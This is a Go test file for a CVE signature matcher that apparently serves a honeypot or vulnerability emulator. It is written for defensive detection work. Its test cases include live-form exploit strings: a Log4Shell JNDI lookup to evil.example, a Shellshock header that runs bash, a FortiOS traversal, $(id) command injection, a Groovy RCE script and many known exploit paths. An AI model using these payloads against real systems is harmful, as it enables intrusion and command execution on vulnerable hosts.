package cve

import "testing"

func TestMatchPayloadLog4Shell(t *testing.T) {
	req := "GET /?x=${jndi:ldap://evil.example/a} HTTP/1.1\r\nUser-Agent: ${jndi:dns://x}\r\n\r\n"
	hits := MatchPayload("http", req)
	if len(hits) == 0 {
		t.Fatal("expected Log4Shell match")
	}
	found := false
	for _, h := range hits {
		if h.ID == "CVE-2021-44228" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected CVE-2021-44228; got %+v", hits)
	}
}

func TestMatchPayloadShellshock(t *testing.T) {
	req := "GET / HTTP/1.1\r\nUser-Agent: () { :;}; /bin/bash -c id\r\n\r\n"
	if hits := MatchPayload("http", req); len(hits) == 0 || hits[0].ID != "CVE-2014-6271" {
		t.Errorf("expected Shellshock; got %+v", hits)
	}
}

func TestMatchPayloadApplianceTraversal(t *testing.T) {
	req := "GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession HTTP/1.1\r\n\r\n"
	if hits := MatchPayload("fortinet", req); len(hits) == 0 || hits[0].ID != "CVE-2018-13379" {
		t.Errorf("expected FortiOS traversal; got %+v", hits)
	}
}

func TestMatchPayloadHTTPMatchesHTTPS(t *testing.T) {
	req := "POST / HTTP/1.1\r\n\r\nclass.module.classLoader.x"
	if hits := MatchPayload("https", req); len(hits) == 0 {
		t.Error("http-layer CVE should also match https handler")
	}
}

func TestMatchPayloadNoFalsePositive(t *testing.T) {
	req := "GET /index.html HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
	if hits := MatchPayload("http", req); len(hits) != 0 {
		t.Errorf("benign request matched a CVE: %+v", hits)
	}
}

func TestMatchPayloadSMBAndRDP(t *testing.T) {
	// EternalBlue: the "\PIPE\" tree path appears as ASCII in the SMB1
	// request (case-insensitive match against the lowercased signature).
	smb := "\xffSMB" + "....\\PIPE\\srvsvc...."
	if hits := MatchPayload("smb", smb); len(hits) == 0 || hits[0].ID != "CVE-2017-0144" {
		t.Errorf("expected EternalBlue on smb; got %+v", hits)
	}
	// BlueKeep: the rogue MS_T120 channel name in the MCS Connect PDU.
	rdp := "\x03\x00....MS_T120\x00...."
	if hits := MatchPayload("rdp", rdp); len(hits) == 0 || hits[0].ID != "CVE-2019-0708" {
		t.Errorf("expected BlueKeep on rdp; got %+v", hits)
	}
	// Removed records must not resurface.
	if _, ok := Lookup("CVE-2014-0160"); ok {
		t.Error("Heartbleed should have been removed (not detectable post-TLS-decrypt)")
	}
	if _, ok := Lookup("CVE-2020-0796"); ok {
		t.Error("SMBGhost should have been removed (not substring-detectable)")
	}
}

func TestForServiceAndLookup(t *testing.T) {
	if recs := ForService("http"); len(recs) == 0 {
		t.Error("expected http CVEs")
	}
	rec, ok := Lookup("CVE-2021-44228")
	if !ok || rec.Name != "Log4Shell" {
		t.Errorf("lookup Log4Shell: %+v ok=%v", rec, ok)
	}
	if _, ok := Lookup("CVE-0000-0000"); ok {
		t.Error("unknown CVE should not be found")
	}
}

func TestMatchPayloadAddedCVEs(t *testing.T) {
	cases := map[string]string{
		"GET /wls-wsat/CoordinatorPortType HTTP/1.1":            "CVE-2017-10271",
		"GET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1": "CVE-2019-18935",
		"POST /_ignition/execute-solution HTTP/1.1":             "CVE-2021-3129",
		"GET /cgi-bin/nas_sharing.cgi?user=messagebus HTTP/1.1": "CVE-2024-3273",
	}
	for payload, want := range cases {
		hits := MatchPayload("http", payload)
		found := false
		for _, r := range hits {
			if r.ID == want {
				found = true
			}
		}
		if !found {
			t.Errorf("payload %q: want %s in %v", payload, want, hits)
		}
	}
}

func TestAdvisoryOnlyLookup(t *testing.T) {
	for _, id := range []string{"CVE-2018-15473", "CVE-2018-0171"} {
		r, ok := Lookup(id)
		if !ok || r.Technique == "" {
			t.Errorf("advisory CVE %s should be in catalog with a technique", id)
		}
	}
}

func TestMatchPayloadNewWebCVEs(t *testing.T) {
	cases := map[string]string{
		"GET /mifs/aad/api/v2/authorized/users HTTP/1.1": "CVE-2023-35078",
		"GET /SetupWizard.aspx/x HTTP/1.1":               "CVE-2024-1709",
		"POST /setup/setupadministrator.action HTTP/1.1": "CVE-2023-22515",
		"GET /cli?remoting=false HTTP/1.1":               "CVE-2024-23897",
		"GET /catalog-portal/ui/oauth/verify HTTP/1.1":   "CVE-2022-22954",
		"GET /_async/AsyncResponseService HTTP/1.1":      "CVE-2019-2725",
		"POST /fileupload/toolsAny/x.jsp HTTP/1.1":       "CVE-2022-29464",
		"GET /goanywhere/lic/accept HTTP/1.1":            "CVE-2023-0669",
		"GET /invoker/JMXInvokerServlet HTTP/1.1":        "CVE-2017-12149",
		"GET /login/index.php?login=$(id) HTTP/1.1":      "CVE-2022-44877",
	}
	for payload, want := range cases {
		hits := MatchPayload("http", payload)
		found := false
		for _, r := range hits {
			if r.ID == want {
				found = true
			}
		}
		if !found {
			t.Errorf("payload %q: want %s in %v", payload, want, hits)
		}
	}
}

// TestMatchPayloadServiceScoped: appliance- and product-scoped signatures
// must fire on their handler (and ES on the elasticsearch handler) but not
// leak onto an unrelated benign HTTP request.
func TestMatchPayloadServiceScoped(t *testing.T) {
	if hits := MatchPayload("pulse", "GET /dana-ws/saml20.ws HTTP/1.1"); !containsID(hits, "CVE-2024-21893") {
		t.Errorf("pulse SSRF not matched: %v", hits)
	}
	if hits := MatchPayload("citrix_gateway", "GET /gwtest/formssso?event=start&target=x HTTP/1.1"); !containsID(hits, "CVE-2023-3519") {
		t.Errorf("citrix RCE not matched: %v", hits)
	}
	es := `POST /_search {"script":{"lang":"groovy","inline":"java.lang.Math.class.forName('x')"}}`
	if hits := MatchPayload("elasticsearch", es); !containsID(hits, "CVE-2015-1427") {
		t.Errorf("elasticsearch groovy RCE not matched: %v", hits)
	}
}

func containsID(recs []Record, id string) bool {
	for _, r := range recs {
		if r.ID == id {
			return true
		}
	}
	return false
}

// TestOTAdvisoryCVEs: the OT/ICS control-protocol CVEs are catalogued as
// advisory-only (no payload signature — binary/framed protocols), mapped to
// the correct emulated service, and ATT&CK-tagged. ForService must surface
// each on its protocol handler so vuln_emulation can advertise the device.
func TestOTAdvisoryCVEs(t *testing.T) {
	want := map[string]string{ // id -> service
		"CVE-2021-22779": "modbus",
		"CVE-2018-7852":  "modbus",
		"CVE-2016-2200":  "s7",
		"CVE-2019-10929": "s7comm_plus",
		"CVE-2022-31806": "codesys",
		"CVE-2020-10245": "codesys",
		"CVE-2022-31802": "codesys",
		"CVE-2021-27432": "opcua",
		"CVE-2023-4346":  "knx",
		"CVE-2015-5374":  "iec104",
		"CVE-2019-13524": "ge_srtp",
		"CVE-2020-6986":  "fins",
		"CVE-2021-20591": "melsec",
		"CVE-2022-38138": "mms",
		"CVE-2013-2783":  "dnp3",
		"CVE-2017-16744": "fox",
		"CVE-2016-8367":  "pcworx",
		"CVE-2020-16209": "hartip",
		"CVE-2025-58428": "atg",
		"CVE-2018-8867":  "ge_srtp",
	}
	if len(want) != 20 {
		t.Fatalf("expected 20 OT CVEs in the test set, have %d", len(want))
	}
	for id, svc := range want {
		rec, ok := Lookup(id)
		if !ok {
			t.Errorf("%s: missing from catalog", id)
			continue
		}
		if rec.Service != svc {
			t.Errorf("%s: Service = %q; want %q", id, rec.Service, svc)
		}
		if rec.Detectable() {
			t.Errorf("%s: should be advisory-only (no signatures), got %d", id, len(rec.Signatures))
		}
		if rec.Technique == "" || rec.Tactic == "" {
			t.Errorf("%s: missing ATT&CK Technique/Tactic", id)
		}
		if rec.CVSS <= 0 {
			t.Errorf("%s: missing CVSS", id)
		}
		if !containsID(ForService(svc), id) {
			t.Errorf("%s: ForService(%q) did not surface it", id, svc)
		}
	}
	// Advisory-only OT records must never produce a MatchPayload hit (no
	// false positives from a binary control frame that happens to embed an
	// OT vendor name in ASCII).
	if hits := MatchPayload("modbus", "schneider modicon umas read"); len(hits) != 0 {
		t.Errorf("advisory-only OT records must not MatchPayload: %v", hits)
	}
}
